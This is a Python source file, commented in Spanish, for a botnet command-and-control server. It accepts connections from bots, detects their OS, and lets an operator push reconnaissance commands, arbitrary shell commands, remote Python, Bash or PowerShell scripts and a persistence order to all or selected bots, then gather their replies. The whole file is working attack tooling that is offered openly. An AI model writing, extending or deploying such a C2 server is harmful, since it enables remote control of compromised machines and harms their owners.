import socket
import threading
import time

HOST = "172.31.128.167" # IP del servidor
PORT = 9999 # Puerto que escucha
bots = [] # List de bots
bot_ids = {} # Diccinario con los IDS de los bots
sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot

def manejar_bot(conn, addr, bot_id):
    """
    Maneja la conexión con un bot, recibiendo sus respuestas y almacenándolas.
    """
    print(f"Bot {bot_id} conectado desde {addr}")

    # Detectar sistema operativo
    try:
        conn.send("detect_os".encode("utf-8"))
        os_info = conn.recv(1024).decode("utf-8").strip().lower()
        sistemas_operativos[conn] = "windows" if "windows" in os_info else "linux"
        print(f"Bot {bot_id} identificado como {sistemas_operativos[conn].capitalize()}")
    except Exception as e:
        print(f"Error al detectar OS de {addr}: {e}")
        sistemas_operativos[conn] = "desconocido"

    while True:
        try:
            data = conn.recv(4096).decode("utf-8", errors="ignore").strip()
            if not data:
                continue

            # Guardar la respuesta en el diccionario sin imprimirla
            respuestas_bots[bot_id] = data

        except socket.timeout:
            print(f"Tiempo de espera agotado con {addr}.")
        except Exception as e:
            print(f"Error con {addr}: {e}")
            break

    # Manejo de desconexión
    conn.close()
    if conn in bots:
        bots.remove(conn)
    if conn in bot_ids:
        del bot_ids[conn]
    if conn in sistemas_operativos:
        del sistemas_operativos[conn]
    print(f"Bot {bot_id} desconectado")


def servidor_CnC():

    """
    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia
    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo
    para aceptar conexiones y entra en un bucle para mostrar un menú principal
    que permite al usuario interactuar con los bots conectados.

    :return: None
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket
    server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto
    server.listen(5) # Escuchar conexiones
    print(f"Escuchando en {HOST}:{PORT}...") # Imprimir que el servidor esta escuchando
    
    threading.Thread(target=aceptar_conexiones, args=(server,)).start() # Crear un hilo para aceptar conexiones

    while True:
        print("\nMenú Principal:")
        print("1. Listar bots conectados")
        print("2. Enviar comandos")
        print("3. Cerrar conexión con un bot")
        print("4. Salir")
        opcion = input("Seleccione una opción: ")

        if opcion == "1":
            listar_bots()
        elif opcion == "2":
            menu_comandos()
        elif opcion == "3":
            cerrar_conexion_bots()
        elif opcion == "4":
            print("Saliendo de la consola...")
            exit()
        else:
            print("Opción no válida. Intente de nuevo.")

def aceptar_conexiones(server):
    """
    Acepta conexiones de bots y las asigna a un hilo para manejarlas.

    Este hilo infinito espera conexiones de bots y las asigna a la lista de
    bots conectados. A cada bot se le asigna un ID único y se crea un hilo
    para manejar la conexión. El hilo maneja_bot se encarga de recibir los
    mensajes del bot, detectar el sistema operativo y ejecutar comandos
    enviados por el usuario.

    :param server: El socket del servidor C&C.
    :type server: socket.socket
    """
    bot_id = 1 # Contador de bots
    while True:
        conn, addr = server.accept() # Aceptar la conexión
        bots.append(conn) # Agregar el bot a la lista
        bot_ids[conn] = bot_id # Asignar el ID del bot
        threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start() # Crear un hilo para manejar la conexión
        bot_id += 1 # Incrementar el contador de bots

def listar_bots():
    """
    Muestra la lista de bots conectados al servidor C&C, incluyendo
    su identificador, sistema operativo y dirección IP y puerto de
    conexión.
    
    :return: None
    """
    if bots:
        print("\nBots conectados:")
        for bot in bots: # Recorrer la lista de bots
            so = sistemas_operativos.get(bot, "Desconocido") # Obtener el SO del bot
            print(f"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}") # Imprimir el bot
    else:
        print("No hay bots conectados.")

def menu_comandos():
    
    """
    Muestra el menú de comandos disponibles para ejecutar en los bots
    conectados y permite al usuario seleccionar una orden para ejecutar en
    todos los bots o en algunos seleccionados manualmente.

    :return: None
    """

    if not bots:
        print("No hay bots conectados.")
        return

    print("\nÓrdenes disponibles:")
    print("1. Hacer PING a una dirección específica")
    print("2. Obtener información del sistema")
    print("3. Listar archivos en el directorio actual")
    print("4. Ver procesos en ejecución")
    print("5. Consultar conexiones de red")
    print("6. Obtener la IP pública")
    print("7. Ejecutar un comando personalizado")
    print("8. Ejecutar un script remoto")
    print("9. Intentar asegurar la persistencia")
    
    orden = input("Seleccione una orden: ")
    comando_windows = ""
    comando_linux = ""

    if orden == "1":
        direccion = input("Ingrese la dirección a hacer PING: ")
        comando_windows = f"ping {direccion}"
        comando_linux = f"ping -c 4 {direccion}"
    elif orden == "2":
        comando_windows = "systeminfo"
        comando_linux = "uname -a && lsb_release -a"
    elif orden == "3":
        comando_windows = "dir"
        comando_linux = "ls -lah"
    elif orden == "4":
        comando_windows = "tasklist"
        comando_linux = "ps aux"
    elif orden == "5":
        comando_windows = "netstat -ano"
        comando_linux = "netstat -tunapl"
    elif orden == "6":
        comando_windows = "curl ifconfig.me"
        comando_linux = "curl ifconfig.me"
    elif orden == "7":
        comando_windows = input("Ingrese el comando personalizado para Windows: ")
        comando_linux = input("Ingrese el comando personalizado para Linux: ")
    elif orden == "8":
        print("Seleccione el tipo de script:")
        print("1. Python")
        print("2. Bash")
        print("3. Otro (especificar)")
        
        tipo = input("Ingrese la opción: ")

        if tipo == "1":
            extension = "py"
            interprete_linux = "python3 -c"
            interprete_windows = "python -c"
        elif tipo == "2":
            extension = "sh"
            interprete_linux = "bash -c"
            interprete_windows = "powershell -Command"
        elif tipo == "3":
            extension = input("Ingrese la extensión del script (ejemplo: ps1, rb, pl): ")
            interprete_linux = input("Ingrese el comando para ejecutarlo en Linux: ")
            interprete_windows = input("Ingrese el comando para ejecutarlo en Windows: ")
        else:
            print("Opción inválida.")
            return

        print("\n¿Cómo desea proporcionar el script?")
        print("1. Escribirlo aquí")
        print("2. Proporcionar la ruta de un archivo")
        
        metodo = input("Ingrese la opción: ")

        if metodo == "1":
            print(f"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:")
            lineas = []
            while True:
                try:
                    linea = input()
                    if linea.strip().upper() == "EOF":  # Detectar EOF
                        break
                    lineas.append(linea)
                except KeyboardInterrupt:  # Capturar Ctrl+C para salir
                    print("\nEntrada cancelada.")
                    return
            script = "\n".join(lineas)  # Unir líneas en una sola cadena
        elif metodo == "2":
            ruta = input("Ingrese la ruta del archivo: ")
            try:
                with open(ruta, "r", encoding="utf-8") as archivo:
                    script = archivo.read()
            except Exception as e:
                print(f"Error al leer el archivo: {e}")
                return
        else:
            print("Opción inválida.")
            return

        # Reemplazar comillas para evitar problemas con la ejecución remota
        script = script.replace('"', r'\"').replace("'", r"\'")

        comando_windows = f'{interprete_windows} "{script}"'
        comando_linux = f"{interprete_linux} '{script}'"

        enviar_comando(comando_windows, comando_linux)
    elif orden == "9":
        print("\nIntentando asegurar la persistencia en los bots seleccionados...")
        comando_windows = "persistencia"
        comando_linux = "persistencia"
        enviar_comando(comando_windows, comando_linux)

    else:
        print("Opción no válida.")
        return

    enviar_comando(comando_windows, comando_linux)

import time

def enviar_comando(comando_windows, comando_linux):
    """
    Selecciona bots para enviar comandos y espera todas las respuestas antes de mostrar el menú de nuevo.
    """
    if not bots:
        print("No hay bots conectados.")
        return

    print("\nSeleccione a qué bots enviar el comando:")
    print("1. Todos los bots")
    print("2. Solo bots Windows")
    print("3. Solo bots Linux")
    print("4. Un bot específico")
    print("5. Lista de bots específicos")

    seleccion = input("Ingrese su opción: ")
    bots_seleccionados = []

    if seleccion == "1":
        bots_seleccionados = bots
    elif seleccion == "2":
        bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == "windows"]
    elif seleccion == "3":
        bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == "linux"]
    elif seleccion == "4":
        listar_bots()
        try:
            bot_id = int(input("Ingrese el ID del bot: "))
            bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)
            if bot:
                bots_seleccionados.append(bot)
            else:
                print("ID de bot no válido.")
                return
        except ValueError:
            print("ID inválido. Debe ingresar un número.")
            return
    elif seleccion == "5":
        listar_bots()
        try:
            bot_ids_seleccionados = [int(id.strip()) for id in input("Ingrese los IDs de los bots separados por comas: ").split(",") if id.strip().isdigit()]
            bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]
            if not bots_seleccionados:
                print("No se encontraron bots con los IDs proporcionados.")
                return
        except ValueError:
            print("Entrada inválida. Debe ingresar números separados por comas.")
            return
    else:
        print("Opción no válida.")
        return

    respuestas = {}

    for bot in bots_seleccionados:
        respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux)

    print("\n--- Respuestas de los bots ---\n")
    for bot, respuesta in respuestas.items():
        bot_info = f"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})"
        print(f"[→] {bot_info}: {respuesta}")

    print("\n--- Volviendo al menú principal ---\n")
    time.sleep(2)


respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots

import time

def enviar_comando_a_bot(bot, comando_windows, comando_linux):
    """
    Envía un comando a un bot específico y espera su respuesta hasta que `manejar_bot()` la almacene.
    """
    so = sistemas_operativos.get(bot, "desconocido")
    comando = comando_windows if so == "windows" else comando_linux
    bot_id = bot_ids.get(bot, "Desconocido")

    try:
        bot.send(comando.encode('utf-8'))
        print(f"\n[✓] Orden enviada a bot {bot_id} ({so.capitalize()})\n")

        # Esperar hasta que `manejar_bot()` almacene la respuesta
        tiempo_maximo = 5  # Segundos
        tiempo_inicial = time.time()

        while time.time() - tiempo_inicial < tiempo_maximo:
            if bot_id in respuestas_bots:
                respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta
                print(f"\n--- Respuesta del Bot {bot_id} ---\n{respuesta}\n")
                return respuesta if respuesta else "[INFO] Comando ejecutado sin salida"
            time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente

        return "[ERROR] No hubo respuesta del bot (Timeout)"

    except (socket.error, BrokenPipeError):
        print(f"[✗] Bot {bot_id} desconectado.")
        if bot in bots:
            bots.remove(bot)
        if bot in bot_ids:
            del bot_ids[bot]
        if bot in sistemas_operativos:
            del sistemas_operativos[bot]
        return "[ERROR] El bot se ha desconectado."

def cerrar_conexion_bots():
    
    """
    Cierra la conexión con un bot seleccionado por el usuario.
    
    El usuario puede seleccionar a los bots a los que quiere cerrar la conexión
    mediante un ID o bien escribir "todos" para cerrar la conexión con todos
    los bots conectados.
    
    :return: None
    """
    
    if not bots:
        print("No hay bots conectados.")
        return

    listar_bots()
    
    try:
        bot_id = int(input("Seleccione el ID del bot cuya conexión quiere cerrar: ")) # Obtener el ID del bot seleccionado
    except ValueError:
        print("ID inválido. Debe ingresar un número.")
        return

    bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente
    
    if not bot: # Si no se encuentra el bot
        print(f"ID de bot {bot_id} no válido.") # Imprimir un mensaje de error
        return

    try:
        bot.close() # Cerrar la conexión
        print(f"Conexión con el bot {bot_id} cerrada.") # Imprimir un mensaje de confirmación
    except Exception as e:
        print(f"Error al cerrar la conexión con el bot {bot_id}: {e}")

    if bot in bots:
        bots.remove(bot) # Eliminar el bot de la lista

    if bot in bot_ids:
        del bot_ids[bot] # Eliminar el ID del bot

    if bot in sistemas_operativos:
        del sistemas_operativos[bot] # Eliminar el SO del bot

    print(f"Bot {bot_id} eliminado correctamente del sistema.")


if __name__ == "__main__":
    servidor_CnC()
